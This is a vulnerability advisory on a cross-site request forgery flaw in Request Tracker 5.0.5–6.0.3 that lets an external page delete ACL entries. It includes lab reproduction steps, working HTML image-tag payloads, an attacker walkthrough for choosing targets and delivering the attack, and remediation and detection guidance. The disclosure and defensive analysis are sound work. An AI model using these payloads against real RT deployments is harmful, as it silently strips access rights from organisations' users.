# TTA-2026-016: Request Tracker 5.0.5 through 6.0.3 cross-site request forgery in `/Helpers/RightsInspector/Revoke` revokes arbitrary ACL entries

**Severity: High** — Suggested CVSS 3.1: 7.1 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:L`)

### Title

The `Revoke` helper mutates ACL state through a single whitelisted `id` argument, so RT's automatic CSRF exemption treats it as an idempotent read and skips Referer validation.

### Summary

`/Helpers/RightsInspector/Revoke` deletes an ACL entry (`RT::ACE`) identified by a numeric `id`. RT's CSRF protection exempts a component when every supplied argument name appears in `@GLOBAL_WHITELISTED_ARGS` or in a component-specific whitelist, on the stated assumption that such requests are "likely to be an idempotent request, which are not susceptible to CSRF". `id` is the first entry in the global whitelist. The `Revoke` component appears in none of the three override tables (`%IS_BLACKLISTED_COMPONENT`, `%IS_WHITELISTED_COMPONENT`, `%WHITELISTED_COMPONENT_ARGS`).

A request that carries only `id` therefore satisfies the exemption test, and the code path returns before the `Referer` header is ever compared. Because RT's protection is Referer-based rather than token-based, skipping that comparison is equivalent to having no protection at all for this endpoint. Any page on any origin can issue `GET /Helpers/RightsInspector/Revoke?id=<ACE_ID>` and the browser will attach the victim's RT session cookie, so the ACL entry is deleted with the victim's authority.

The practical shape of the attack is a one-line HTML payload served from anywhere:

```html
<img src="https://rt.example/Helpers/RightsInspector/Revoke?id=19" width="1" height="1">
```

The victim loads the page while logged in, sees nothing, and one authorization row is gone. Repeating the tag for a list of ids removes many rows in a single page load.

The defect was reproduced dynamically on an isolated RT 5.0.5 instance, with the state change confirmed directly in the PostgreSQL `ACL` table, and it was confirmed by source inspection in 5.0.10 and 6.0.3, where the helper source is byte-identical apart from the copyright year and the exemption logic is unchanged. The 6.0.3 release is the newest available at the time of writing, so this is not a fixed-in-latest issue.

### Affected Version

- Vendor: Best Practical Solutions, LLC
- Product: Request Tracker
- Confirmed affected version: 5.0.5 (dynamic reproduction on an isolated instance)
- Same defect present by source inspection: 5.0.10 and 6.0.3 (the newest release reviewed)
- Core components: `share/html/Helpers/RightsInspector/Revoke`, `lib/RT/Interface/Web.pm`
- Endpoint: `GET /Helpers/RightsInspector/Revoke?id=<ACE_ID>`
- Default configuration: `$RestrictReferrer` defaults to `1`, so the CSRF check is enabled by default and this is not a hardening-dependent issue

RT 5.0.5 was dynamically tested. RT 5.0.10 and RT 6.0.3 were compared at the source level only and were not executed; the claim for those versions is limited to what the unchanged source shows.

### Vulnerability Type

Cross-Site Request Forgery (CWE-352); related: Incorrect Authorization / missing state-changing-request classification (CWE-863), and the underlying design fault of inferring request semantics from parameter names (CWE-749, CWE-1287).

### Affected Code

- `share/html/Helpers/RightsInspector/Revoke` — the state-changing helper; its only argument is `id`.
- `lib/RT/Interface/Web.pm` — `@GLOBAL_WHITELISTED_ARGS` (contains `id`), `%IS_BLACKLISTED_COMPONENT`, `%WHITELISTED_COMPONENT_ARGS`, `%IS_WHITELISTED_COMPONENT`, `IsCompCSRFWhitelisted`, `AreCompCSRFParametersWhitelisted`, `IsPossibleCSRF`, `MaybeShowInterstitialCSRFPage`, and the call site in `HandleRequest`.
- `lib/RT/ACE.pm` — `Delete`, the only authorization gate on the operation.
- `lib/RT/Principal.pm` — `RevokeRight`, which re-loads the ACE by values and calls `Delete`.

The complete helper, as shipped in all three versions reviewed:

```perl
<%ARGS>
$id => undef
</%ARGS>
<%INIT>
my $ACE = RT::ACE->new($session{CurrentUser});
$ACE->Load($id);

my $Principal = $ACE->PrincipalObj;
my $Object    = $ACE->Object;
my $Right     = $ACE->RightName;

my ($ok, $msg) = $Principal->RevokeRight(Object => $Object, Right => $Right);

$r->content_type('application/json; charset=utf-8');
$m->out(JSON({ok => $ok, msg => $msg}));
$m->abort;
</%INIT>
```

There is no method check, no token check, and no origin check in the component itself — all of that is delegated to the global CSRF layer, which is the layer that exempts it.

### How the defect was found

The audit started from a general question rather than from this endpoint: which RT components change server state while accepting only arguments that RT's CSRF layer treats as safe? The procedure below reproduces the reasoning; it needs only the source tree, no running instance.

**Step 1 — enumerate the surface.** All Mason components that are directly routable were listed, with the argument names each declares:

```bash
find share/html -path '*/Helpers/*' -o -path '*/NoAuth/*' | sort > components.txt
# for each file, print its <%ARGS> block
while read -r f; do
  printf '== %s\n' "$f"
  perl -0777 -ne 'print $1 if /<\%ARGS>(.*?)<\/\%ARGS>/s' "$f"
done < components.txt > component-args.txt
```

**Step 2 — intersect with the exemption tables.** The three tables in `lib/RT/Interface/Web.pm` were extracted and compared against the component list. The interesting candidates are components whose declared arguments are a subset of `@GLOBAL_WHITELISTED_ARGS` (`id`, `results`, `HomeRefreshInterval`, `NotMobile`, `sc`) and which are absent from both component-level tables.

**Step 3 — separate reads from writes.** A component that only renders a record is harmless under that exemption; the bug is a component that deletes or updates. `/Helpers/RightsInspector/Revoke` collapsed the two conditions: one argument, and that argument selects a row to delete.

**Step 4 — confirm the shape is a known-problem shape.** RT already carries one entry in `%IS_BLACKLISTED_COMPONENT`, `/Helpers/Toggle/TicketBookmark`, commented "Takes only id and toggles bookmark state". That entry is the maintainers' own statement that "only id" does not imply "safe". `Revoke` has exactly that shape and is absent from the list, which turns a hypothesis into a missing-entry finding rather than a design opinion.

**Step 5 — prove it dynamically and prove the control.** A lab instance was built, a disposable ACE was created, the request was sent with a foreign `Referer`, the row was confirmed deleted in the database, and three negative controls were run (a blacklisted component, the same request with one extra non-whitelisted argument, and the same request without a session). All three controls behaved correctly, which locates the cause in the argument-name heuristic rather than in a globally disabled CSRF layer.

**Step 6 — establish version scope.** The three release tags were fetched and compared rather than assumed:

```bash
for tag in rt-5.0.5 rt-5.0.10 rt-6.0.3; do
  curl -sS -o "Revoke.$tag" \
    "https://raw.githubusercontent.com/bestpractical/rt/$tag/share/html/Helpers/RightsInspector/Revoke"
  curl -sS -o "Web.$tag.pm" \
    "https://raw.githubusercontent.com/bestpractical/rt/$tag/lib/RT/Interface/Web.pm"
done
diff Revoke.rt-5.0.5 Revoke.rt-6.0.3        # only the copyright year differs
grep -n "GLOBAL_WHITELISTED_ARGS\|IS_BLACKLISTED_COMPONENT\|RightsInspector" Web.rt-6.0.3.pm
```

The diff output is a single changed line, the copyright year. The 6.0.3 exemption tables still contain `id` and still do not contain `Revoke`.

### Root Cause

Two decisions that are individually defensible combine into a bypass.

**First decision: authorization is delegated, and it is correct.** `RT::Principal::RevokeRight` resolves the ACE and calls `RT::ACE::Delete`, whose only check is:

```perl
sub Delete {
    my $self = shift;

    unless ($self->CurrentUser->HasRight(Right => 'ModifyACL', Object => $self->Object)) {
        return ( 0, $self->loc('Permission Denied') );
    }
    ...
}
```

An anonymous caller therefore cannot delete anything, and a low-privilege caller gets `Permission Denied`. This check is not the flaw; it is why the impact is bounded to users who already hold `ModifyACL`. What it does not do — and cannot do, being a server-side authorization check — is distinguish "the legitimate user clicked Revoke" from "the user's browser was told to fetch an image".

**Second decision: idempotency is inferred from argument names.** The CSRF layer decides whether to enforce the Referer check by looking at the request's parameter names:

```perl
our @GLOBAL_WHITELISTED_ARGS = (
    # For example, "id" is acceptable because that is how RT retrieves a
    # record.
    'id',
    'results',
    'HomeRefreshInterval',
    'NotMobile',
);

sub AreCompCSRFParametersWhitelisted {
    my $sub  = shift;
    my $ARGS = shift;

    my %leftover_args = %{ $ARGS };
    my @whitelisted_args = (@GLOBAL_WHITELISTED_ARGS, @{ $WHITELISTED_COMPONENT_ARGS{$sub} || [] });

    for my $arg (@whitelisted_args) {
        delete $leftover_args{$arg};
    }

    # If there are no arguments, then it's likely to be an idempotent
    # request, which are not susceptible to CSRF
    return !%leftover_args;
}
```

The heuristic is "few arguments ⇒ probably a read". `Revoke` is a counter-example: exactly one argument, and that argument is the primary key of the row it destroys.

**How the two combine.** `IsPossibleCSRF` consults the exemption first and returns before the Referer comparison:

```perl
sub IsPossibleCSRF {
    my $ARGS = shift;
    ...
    return 0 if IsCompCSRFWhitelisted(
        $HTML::Mason::Commands::m->request_comp->path,
        $ARGS
    );

    # if there is no Referer header then assume the worst
    return (1, "your browser did not supply a Referrer header")
        if !RequestENV('HTTP_REFERER');
    ...
}
```

So the decision sequence for `GET /Helpers/RightsInspector/Revoke?id=19` with `Referer: http://evil.attacker.test/poc.html` is:

```
HandleRequest
  └─ MaybeShowInterstitialCSRFPage        (Web.pm:428 in 5.0.5, :486 in 6.0.3)
       └─ return unless RT->Config->Get('RestrictReferrer')     -- default 1, so continue
            └─ IsPossibleCSRF
                 └─ IsCompCSRFWhitelisted('/Helpers/RightsInspector/Revoke', {id => 19})
                      ├─ %IS_BLACKLISTED_COMPONENT{...}      -- absent, continue
                      ├─ %IS_WHITELISTED_COMPONENT{...}      -- absent, continue
                      └─ AreCompCSRFParametersWhitelisted    -- {id} minus global whitelist = {}
                           └─ return !%leftover_args  ==  1  -- exempt
                 └─ return 0                                      <-- never compares Referer
       └─ no interstitial, no log entry
  └─ component INIT runs
       ├─ RT::ACE->Load(19)
       ├─ $ACE->Object, $ACE->RightName
       └─ Principal->RevokeRight  ->  RT::ACE::Delete -> ModifyACL check -> DELETE FROM ACL
```

**Why the blacklist exists and why the omission matters.** `%IS_BLACKLISTED_COMPONENT` is the escape hatch for exactly this situation, and its single entry documents the reasoning:

```perl
our %IS_BLACKLISTED_COMPONENT = (
    # Takes only id and toggles bookmark state
    '/Helpers/Toggle/TicketBookmark' => 1,
);
```

`Revoke` matches that comment's own description — takes only `id`, changes state — and is not listed. `%WHITELISTED_COMPONENT_ARGS` covers the two neighbouring RightsInspector components but not this one, which suggests the omission is an oversight rather than a deliberate acceptance:

```perl
our %WHITELISTED_COMPONENT_ARGS = (
    ...
    '/Admin/Tools/RightsInspector.html' => ['Principal', 'Object', 'Right'],
    '/Helpers/RightsInspector/Search'   => ['principal', 'object', 'right', 'continueAfter'],
    # '/Helpers/RightsInspector/Revoke' is not present
);
```

**Version status:**

| Version | `Revoke` component | `@GLOBAL_WHITELISTED_ARGS` contains `id` | `%IS_BLACKLISTED_COMPONENT` contains `Revoke` | Result |
| --- | --- | --- | --- | --- |
| 5.0.5 | vulnerable | yes | no | request exempted, Referer not checked |
| 5.0.10 | byte-identical (copyright year only) | yes | no | request exempted, Referer not checked |
| 6.0.3 | byte-identical (copyright year only) | yes | no | request exempted, Referer not checked |

Relevant source locations: `@GLOBAL_WHITELISTED_ARGS` at 1544 (5.0.5), 1619 (5.0.10), 1790 (6.0.3); `%IS_BLACKLISTED_COMPONENT` at 1584, 1659, 1825; `IsCompCSRFWhitelisted` at 1589, 1664, 1830; `AreCompCSRFParametersWhitelisted` at 1631, 1706, 1872; `IsPossibleCSRF` at 1691, 1782, 1948; the `MaybeShowInterstitialCSRFPage` call site in `HandleRequest` at 428 (5.0.5) and 486 (6.0.3); `RT::ACE::Delete` at 329 in all three; `RT::Principal::RevokeRight` at 218.

The 6.0.3 code adds one exemption — `return 1 if $IS_WHITELISTED_COMPONENT{$comp} || $comp =~ m{^(?:/SelfService)?/Views/};` — which does not cover this helper, and it removes `HomeRefreshInterval` from the global argument list while keeping `id`.

### Laboratory environment

The dynamic proof ran on a disposable, network-isolated instance. The build was deliberately minimal so that the only thing under test is stock packaging:

| Item | Value |
| --- | --- |
| Application | Request Tracker 5.0.5, installed from the distribution package (`request-tracker5`) |
| Web runtime | `Plack::Handler::Starlet` behind the packaged web server (response `Server:` header) |
| Database | PostgreSQL in a separate container; database `rt5db`, role `rt5` |
| Reachability | loopback port on the analyst workstation only, referred to below as `$RT_BASE` |
| Data | synthetic principals and synthetic ACL rows created for the test; no imported data |

Package attribution was recorded at the time so the finding could not be dismissed as a local modification:

```
$ dpkg -S /usr/share/request-tracker5/html/Helpers/RightsInspector/Revoke
request-tracker5: /usr/share/request-tracker5/html/Helpers/RightsInspector/Revoke
$ perl -I/usr/share/request-tracker5/lib -MRT -e 'print $RT::VERSION'
5.0.5
```

The instance was restored from a snapshot after the test. No production system received any request from this work.

### Steps to Reproduce

The sequence below is the one actually executed. It is written for a lab instance; every identifier is synthetic.

#### Phase 1 — establish a privileged session

```bash
BASE=http://<LAB_HOST>:<LAB_PORT>
curl -sS -m 25 -c lab-admin.jar -b lab-admin.jar \
     "$BASE/?user=lab-admin&pass=<SYNTHETIC_LAB_PASSWORD>" -o login.html
grep -o '<title>[^<]*</title>' login.html      # expect: <title>RT at a glance</title>
```

A verified `RT_SID` cookie in `lab-admin.jar` is the whole of the attacker's prerequisite on the victim side — the attacker never needs it, only the victim's browser needs it.

#### Phase 2 — create a disposable ACL row and record its id

Rather than deleting something the lab needs, an isolated ACE is created through the RT API so the before/after difference is unambiguous:

```perl
# grant_ace.pl
use lib "/usr/share/request-tracker5/lib";
use RT; RT::LoadConfig(); RT::Init();

my $u = RT::User->new(RT->SystemUser);
$u->Load('lab-user');
my ($ok, $msg) = $u->PrincipalObj->GrantRight(
    Object => $RT::System,
    Right  => 'ShowSearchAdvanced',
);
print "GRANT ok=$ok msg=$msg\n";
```

```bash
perl grant_ace.pl
# GRANT ok=1 msg=Right Granted
```

The new row is located by content instead of assuming an id:

```sql
SELECT id, PrincipalType, PrincipalId, RightName, ObjectType, ObjectId
FROM ACL
WHERE RightName = 'ShowSearchAdvanced'
ORDER BY id DESC LIMIT 1;
```

In the recorded run this returned a single new row and its id (`19`) was used as `<SYNTHETIC_ACE_ID>` for the rest of the test. Ids are sequential integers assigned by the database, so an attacker who can see any ACE id can enumerate the rest.

#### Phase 3 — negative controls

Three controls were run first, so that a later success could be attributed.

**(a) A component RT already blacklists, same foreign `Referer`:**

```bash
curl -sS -b lab-admin.jar -e 'http://evil.attacker.test/poc.html' \
  "$BASE/Helpers/AddTimeWorked?id=1&seconds=60" -o control-a.html
```

Observed:

```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...
    <title>Possible cross-site request forgery</title>
```

and in the application log:

```
[notice]: Possible CSRF: Referrer (evil.attacker.test:80) is not allowed (Web.pm:1814)
```

No state change occurred. This proves the CSRF layer is active and functional on this instance.

**(b) The target request plus one non-whitelisted argument:**

```bash
curl -sS -b lab-admin.jar -e 'http://evil.attacker.test/poc.html' \
  "$BASE/Helpers/RightsInspector/Revoke?id=<SYNTHETIC_ACE_ID>&canary=1" -o control-b.html
```

Observed: the same `Possible cross-site request forgery` interstitial, and the ACE survived. Because the only difference from the exploit is one extra argument name, this isolates the cause to `AreCompCSRFParametersWhitelisted` and rules out "the Referer check is broken in general".

**(c) The target request with no session:**

```bash
curl -sS -e 'http://evil.attacker.test/poc.html' \
  "$BASE/Helpers/RightsInspector/Revoke?id=<SYNTHETIC_ACE_ID>" -o control-c.html
```

Observed: a redirect to the login page; the ACE survived. The effect is therefore attributable to the victim's session, not to an unauthenticated path.

#### Phase 4 — the exploit request

Identical to control (b), minus the extra argument:

```bash
curl -sS -b lab-admin.jar -e 'http://evil.attacker.test/poc.html' \
  "$BASE/Helpers/RightsInspector/Revoke?id=<SYNTHETIC_ACE_ID>" -o revoke-result.json
```

Observed response, in full:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Server: Plack::Handler::Starlet
X-Frame-Options: DENY

{"msg":"Revoked right 'ShowSearchAdvanced' from lab-user.","ok":1}
```

No interstitial, and — unlike control (a) — no `Possible CSRF` line appears in the application log for this request.

#### Phase 5 — confirm the state change in the database

```bash
docker exec <LAB_PG_CONTAINER> psql -U rt5 -d rt5db \
  -c "SELECT count(*) FROM ACL WHERE id = <SYNTHETIC_ACE_ID>"
```

Observed before the exploit request: `1`. Observed after: `0`. The row was physically deleted, not flagged.

A second request for the same id returns a distinct answer that confirms the delete was complete rather than pending:

```json
{"msg":"ACE not found","ok":0}
```

#### Phase 6 — the browser delivery variant

The `curl` above stands in for a browser. The real delivery is a page on any origin:

```html
<!doctype html>
<html><head><title>Quarterly report</title></head>
<body>
<h1>Quarterly report</h1>
<p>Loading chart…</p>
<!-- one tag per target ACL row; all fire on page load, in parallel -->
<img src="https://rt.example/Helpers/RightsInspector/Revoke?id=17" width="1" height="1" alt="">
<img src="https://rt.example/Helpers/RightsInspector/Revoke?id=18" width="1" height="1" alt="">
<img src="https://rt.example/Helpers/RightsInspector/Revoke?id=19" width="1" height="1" alt="">
</body></html>
```

Opened while `lab-admin` is logged in to RT, the page is visually indistinguishable from a stub document; the three rows disappear. No token is read, no form is submitted, no user gesture beyond loading the page is required. There is no preflight: a plain `GET` with no custom headers is a "simple request" and is sent regardless of origin.

### Attack walkthrough

From the attacker's side the operation has six steps, none of which needs a credential.

**1. Locate the RT instance.** Any deployment where `/Helpers/RightsInspector/Revoke` responds at all is a candidate; the helper is part of the stock distribution and is not removed by configuration.

**2. Obtain ACE ids.** `id` is the `ACL` table's primary key, a sequential integer. Values can be sampled from the RightsInspector admin pages by any user who can reach them, or simply enumerated in a range — an unknown id costs one wasted request and returns `{"msg":"ACE not found","ok":0}` with no side effect and no alert.

**3. Select targets.** The interesting rows are the ones whose removal changes who can do what: `SuperUser` grants, group grants to `Everyone`, queue-level role grants, and any row whose `PrincipalId` is an administrator. Because the helper identifies the row by id alone, the attacker does not need to know the principal, the object, or the right — only that the row exists.

**4. Identify a victim.** The request executes with the victim's rights, so the victim must hold `ModifyACL` on the target object. In a typical RT deployment that is the administrators and any queue administrator. The attacker needs one of them to load a page while logged in; a support portal, a wiki, an e-mail with remote content, or a link in a ticket are all sufficient delivery channels.

**5. Deliver.** Any HTML context works. The tag above is the minimum; a `<link rel=prefetch>`, a CSS `background-image`, or a redirect chain all reach the same endpoint. Since the request is a GET, no CORS preflight occurs and the response body is irrelevant to the attacker.

**6. Observe indirectly.** The attacker cannot read the JSON cross-origin, but does not need to: the effect is the ACL state, which is observable through behavioural changes (a user loses a queue, an approval path stops working) and, if the attacker holds any account, by re-testing their own rights.

What the attacker gains is not access. It is the ability to subtract rights from arbitrary principals using someone else's authority — a denial-of-authorization primitive that is silent, persistent, and reversible only by re-granting each row by hand.

### Detection and observability

This is the part that makes the issue operationally worse than a normal CSRF: the platform's own detection signal does not fire.

| Signal | Normal CSRF attempt | This request |
| --- | --- | --- |
| Interstitial page returned | yes | no |
| `[notice]: Possible CSRF:` in `rt.log` | yes, with the offending `Referrer` | never written |
| HTTP status | 200 with HTML interstitial | 200 with JSON |
| Response body to the victim | visible warning | nothing rendered (`<img>` target) |

The only remaining trace is the web server access log, where a `GET /Helpers/RightsInspector/Revoke` with a `Referer` outside the RT origin is unusual — legitimate use comes from the RightsInspector admin page as a same-origin request. A detection rule that looks for that combination across all deployments is one line; a rule that assumes `Possible CSRF` covers the family is wrong for this endpoint.

### Impact

An attacker who can get a privileged RT user to load a page, image, or link revokes arbitrary ACL entries with that user's authority. Concretely:

- Rights can be stripped from `Everyone`, from a group, or from a queue, silently removing access for other users and breaking workflows; the change persists across restarts and is only visible in the ACL administration pages.
- A user's own `ModifyACL` entry can be revoked, locking administrators out of rights administration — the recovery path is direct database surgery.
- Because the response is JSON and the request is a plain GET, the operation is invisible in the victim's browser; it can be repeated for many ACE ids from one page load.
- The effect is limited to deletion of existing ACL entries — the helper cannot grant rights, so it is an integrity and availability impact on authorization configuration, not direct escalation or disclosure.

The attacker gains no new access; the victim must already hold `ModifyACL` on the target object. In practice that means RT administrators, queue administrators, and any user delegated rights administration.

### CVSS

`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:L` — 7.1 High.

The score models a remote attacker with no prior privilege who must induce one action by an authenticated privileged user; impact is unauthorized modification of the authorization configuration plus partial loss of access for legitimate users.

## Status

Published as TTA-2026-016 on 2026-10-28. Not reported to the vendor before publication; this repository's prior RT advisories (TTA-2026-001 through TTA-2026-004) received no vendor response at `security@bestpractical.com` after the 2026-10-23 notice, and this report follows the same publication path. CVE eligibility is pending; no CVE has been assigned.

## Review decision (2026-10-29)

- **Technical status: confirmed for RT 5.0.5.** The dynamic proof establishes a real state-changing CSRF: a foreign `Referer` request deleted one synthetic `RT::ACE` row, the database count changed from `1` to `0`, and the blacklist, extra-argument and unauthenticated-session controls behaved as expected. The claims for 5.0.10 and 6.0.3 remain source-level only. The operation still requires a victim session with `ModifyACL`; the attacker supplies the cross-site request but does not gain that right.
- **CVE status: possible separate candidate, not ready for direct numbering.** Send it privately to Best Practical at `security@bestpractical.com` using the vendor's published encryption key. The vendor/CNA must decide whether this is a distinct helper omission, an incomplete fix or version-range correction for CVE-2026-41074, or a combination requiring a new affected-version statement. Do not claim a new CVE or submit to multiple CNAs before that scope decision.
- **Required follow-up:** preserve the raw request/response, package attribution and before/after ACL query; either dynamically reproduce on 5.0.10/6.0.3 or narrow the affected-version claim to 5.0.5. CVSS remains provisional pending review of the privileged-session prerequisite.
- **Deployment handling:** if the RT instance is school-managed, send a separate minimal remediation notice to the school's RT owner in parallel with the vendor report.

## Prerequisites

- RT is reachable by the victim's browser and `$RestrictReferrer` is enabled (the default). Note that disabling it makes the deployment *more* exposed, not less; the finding does not depend on it being disabled.
- The victim holds `ModifyACL` on the object that owns the target ACL entry.
- The victim is logged in to RT in the same browser and visits attacker-controlled content.
- The attacker knows or guesses an ACE id. Ids are sequential integers, and the RightsInspector pages expose them to anyone who reaches those pages.

No RT credential, session value, or administrator action beyond loading a page is required from the attacker.

## Relationship to existing CVEs

- [CVE-2026-41074](https://www.cve.org/CVERecord?id=CVE-2026-41074) (GHSA-265j-qx4w-256j) concerns RT's Referer-based CSRF protection and is published for RT 6.0.0 through 6.0.3 only. Its fix does not add this helper to `%IS_BLACKLISTED_COMPONENT`, and it does not cover the 5.x series. The component and the exemption logic in 6.0.3 remain in the state described above.
- [CVE-2026-44231](https://www.cve.org/CVERecord?id=CVE-2026-44231), [CVE-2026-41075](https://www.cve.org/CVERecord?id=CVE-2026-41075), [CVE-2026-44230](https://www.cve.org/CVERecord?id=CVE-2026-44230) and [CVE-2026-44229](https://www.cve.org/CVERecord?id=CVE-2026-44229) concern REST2 token exposure, REST2 query construction, reflected XSS, and inline-served uploads respectively, and are unrelated to this path.

Whether this is a distinct CVE, an incomplete fix for CVE-2026-41074, or a version-range correction is for Best Practical or the assigning CNA to decide. The report is submitted with that question open.

## Recommended remediation

- Add `'/Helpers/RightsInspector/Revoke' => 1` to `%IS_BLACKLISTED_COMPONENT` as an immediate, minimal fix.
- Stop inferring idempotency from argument names. Require an explicit per-component declaration of whether a component mutates state, and default to enforcing the Referer and token checks when the declaration is absent.
- Require state-changing helpers to accept POST with a CSRF token, and reject non-`POST` methods for them at the dispatcher rather than in each component.
- Keep the `ModifyACL` check in `RT::ACE::Delete` and add a regression test that sends `GET /Helpers/RightsInspector/Revoke?id=<id>` with a foreign `Referer` and asserts that the ACE survives.
- Audit the remaining `/Helpers/*` components that accept only `id` for the same classification error.

## Validation controls

| Case | Expected result |
| --- | --- |
| `GET /Helpers/RightsInspector/Revoke?id=<ACE>` with foreign Referer, privileged session | ACE deleted before fix; must be rejected after fix |
| Same request with one non-whitelisted extra argument | Rejected by the CSRF interstitial (proves the heuristic is the cause) |
| `GET /Helpers/AddTimeWorked?id=<id>&seconds=60` with foreign Referer | Rejected by the CSRF interstitial, log line `Possible CSRF: ... (Web.pm:1814)` |
| `GET /Helpers/RightsInspector/Revoke?id=<ACE>` without a session | Login redirect, ACE unchanged |
| Repeat the exploit request for an already-deleted id | `{"msg":"ACE not found","ok":0}`, no error page |
| Same-origin navigation to the helper from the RightsInspector page | Must continue to work after the fix |

## Evidence boundary

The request, response, and ACL state change above were reproduced on an isolated RT 5.0.5 laboratory instance with synthetic principals and a synthetic ACL entry, and the instance was restored from a snapshot afterwards. No customer hostname, IP address, credential, cookie, session value, or production ACL data is included. The version comparison for 5.0.10 and 6.0.3 is a source review of the public upstream repository, not a dynamic test. No request was sent to any production RT deployment as part of this work.

## Timeline

- 2026-10-09: Cross-version CSRF audit enumerated the `/Helpers/*` surface; `Revoke` identified as a single-`id` state-changing component absent from the exemption tables.
- 2026-10-09: Reproduced on an isolated RT 5.0.5 instance; ACE row confirmed deleted; three negative controls recorded.
- 2026-10-28: Source comparison of 5.0.5, 5.0.10 and 6.0.3 completed; public TTA report published.
